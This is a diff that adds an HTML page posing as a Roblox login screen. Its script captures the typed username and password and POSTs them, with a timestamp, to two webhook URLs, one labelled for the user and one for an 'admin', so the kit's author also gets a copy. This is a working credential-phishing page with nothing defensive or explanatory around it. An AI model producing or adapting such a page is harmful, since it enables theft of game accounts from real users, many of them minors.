@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Roblox Login</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="login-box">
+    <h2>Roblox Login</h2>
+    <form id="loginForm">
+      <input type="text" placeholder="Username" required />
+      <input type="password" placeholder="Password" required />
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const username = document.querySelector("input[type='text']").value;
+      const password = document.querySelector("input[type='password']").value;
+
+      sendToWebhook(username, password);
+    });
+
+    function sendToWebhook(username, password) {
+      const webhookUrl = "https://your-webhook-url.com"; // User webhook
+      const adminWebhookUrl = "https://admin-webhook-url.com"; // Admin webhook
+
+      const data = {
+        username: username,
+        password: password,
+        timestamp: new Date().toISOString()
+      };
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+
+      fetch(adminWebhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+    }
+  </script>
+</body>
+</html>
